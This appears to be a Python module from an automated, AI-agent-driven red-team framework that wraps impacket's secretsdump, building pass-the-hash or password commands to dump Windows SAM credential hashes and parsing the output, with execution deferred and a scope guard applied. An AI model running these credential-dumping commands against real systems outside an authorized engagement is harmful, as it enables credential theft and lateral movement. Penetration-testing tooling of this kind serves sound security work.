"""AutoRed secretsdump tool wrapper — Phase 4, Task 5.

``secretsdump.py`` is the impacket local-SAM-hash dumper. It connects to
a target Windows host via the RemoteRegistry service (or, with the
right switch, parses an offline ``NTDS.dit`` + ``SYSTEM`` registry hive
pair), pulls the local SAM database, and prints every account's
``username:rid:lmhash:nthash:::`` line.

Per the T5 brief, this wrapper does NOT actually execute secretsdump in
Phase 4. It constructs the secretsdump command string (choosing between
``-hashes :<nthash>`` pass-the-hash auth and ``-p <password>`` plain
auth) and persists it via ``_save_raw`` so the Phase 6
FootholdSessionManager can replay it. The returned ``SecretsdumpResult``
has an empty ``hashes`` list. The ``_parse_secretsdump_output`` helper
is exported so a Phase 6 caller can pass real secretsdump stdout back
through the same parser that the unit tests exercise on the fixture file.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression test in
``test_secretsdump_ainvoke_works_with_roe_guard``.

Spec ref: §3.4 (post-ex models), §6.8 (RoE guard), §9.2 (RoE categories).
"""
from __future__ import annotations

import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.secretsdump")


class SecretsdumpResult(BaseModel):
    """Parsed SAM hashes from a secretsdump run.

    Phase 4 callers receive this with ``hashes`` empty — real execution
    is deferred to Phase 6. Phase 6 callers will receive this populated
    via ``_parse_secretsdump_output(real_stdout, host_ip)``.

    Each hash dict has keys: ``username``, ``rid``, ``lmhash``, ``nthash``.
    """

    host_ip: str
    hashes: list[dict[str, str]] = Field(default_factory=list)
    raw_output_path: str = ""
    duration_sec: float = 0.0


# SAM-hash lines look like:
#   ``Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::``
# Username is non-colon non-whitespace, RID is digits, lmhash/nthash are
# hex (or the empty string for the LM-hash-disabled case). The trailing
# ``:::`` is the impacket format delimiter; we anchor on it so we don't
# accidentally capture impacket's progress lines like
# ``[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)`` which contain
# colons but don't end in ``:::``.
_SAM_HASH_PATTERN = re.compile(
    r"^(?P<username>[^:\s]+):(?P<rid>\d+):(?P<lmhash>[0-9a-fA-F]*):(?P<nthash>[0-9a-fA-F]*):::",
    re.MULTILINE,
)


def _parse_secretsdump_output(text: str, host_ip: str) -> SecretsdumpResult:
    """Parse impacket-secretsdump stdout into a ``SecretsdumpResult``.

    Walks every line matching the SAM-hash format and extracts
    ``username`` / ``rid`` / ``lmhash`` / ``nthash``. Impacket prints a
    handful of progress lines (``[*] Service RemoteRegistry is in stopped
    state`` etc.) and a banner — those are filtered out by the trailing
    ``:::`` anchor on the hash regex.

    Empty input must not crash — returns a result with an empty hashes
    list so calling tools can short-circuit safely.
    """
    result = SecretsdumpResult(host_ip=host_ip)
    if not text:
        return result

    for m in _SAM_HASH_PATTERN.finditer(text):
        result.hashes.append(
            {
                "username": m.group("username"),
                "rid": m.group("rid"),
                "lmhash": m.group("lmhash"),
                "nthash": m.group("nthash"),
            }
        )

    return result


def _build_secretsdump_cmd(
    target: str,
    username: str,
    password: str,
    nthash: str,
) -> str:
    """Build the secretsdump command string.

    Pass-the-hash auth (``-hashes :<nthash>``) when ``nthash`` is supplied;
    plain password auth (``-p <password>``) otherwise. The empty LM-hash
    position in ``-hashes :<nthash>`` is intentional — modern Windows
    hosts disable LM hashes, and impacket expects the LM hash field to
    be empty (or the ``aad3b435...`` blank-LM sentinel) when only the
    NTLM hash was recovered.

    Returns a shell string rather than an argv list because secretsdump
    runs on the foothold via the Phase 6 FootholdSessionManager's shell
    session — same Phase 4 stub pattern as mimikatz_wrapper / linpeas_run.
    """
    if nthash:
        return f"secretsdump.py -hashes :{nthash} {username}@{target}"
    return f"secretsdump.py {username}:{password}@{target}"


@tool
@roe_guard(allowed_categories=["read_only"])
async def secretsdump(
    target: str,
    username: str,
    password: str,
    nthash: str = "",
    engagement_id: str = "",
) -> SecretsdumpResult:
    """Dump SAM hashes from a Windows target via impacket-secretsdump.

    The command is constructed for execution via the foothold's shell
    session (pass-the-hash when ``nthash`` is supplied, plain password
    auth otherwise). Actual execution requires the session manager
    (Phase 6). For now, this tool builds the command and saves it to
    ``engagements/<id>/raw/`` so the Phase 6 FootholdSessionManager can
    replay it; the returned ``SecretsdumpResult`` has an empty
    ``hashes`` list because no real secretsdump stdout was produced.

    Args:
        target: Target Windows host IP (used by the RoE guard scope
            check and recorded in ``SecretsdumpResult.host_ip``).
        username: Account to authenticate as.
        password: Plaintext password (used when ``nthash`` is empty).
        nthash: Optional NT hash for pass-the-hash auth (takes precedence
            over ``password`` when non-empty).
        engagement_id: Current engagement ID for raw output storage +
            RoE registry lookup.

    Returns:
        ``SecretsdumpResult`` with ``raw_output_path`` set (command was
        saved) and ``hashes`` empty (Phase 4 stub). Phase 6 callers will
        receive a populated result via the foothold shell session.
    """
    log.info(
        "secretsdump_start",
        target=target,
        username=username,
        auth="pth" if nthash else "password",
    )

    cmd_str = _build_secretsdump_cmd(target, username, password, nthash)

    raw_path = await _save_raw(
        "secretsdump_cmd", target, cmd_str, "", engagement_id
    )

    log.info(
        "secretsdump_done",
        target=target,
        note="command saved, execution deferred to Phase 6",
    )
    return SecretsdumpResult(host_ip=target, raw_output_path=raw_path)
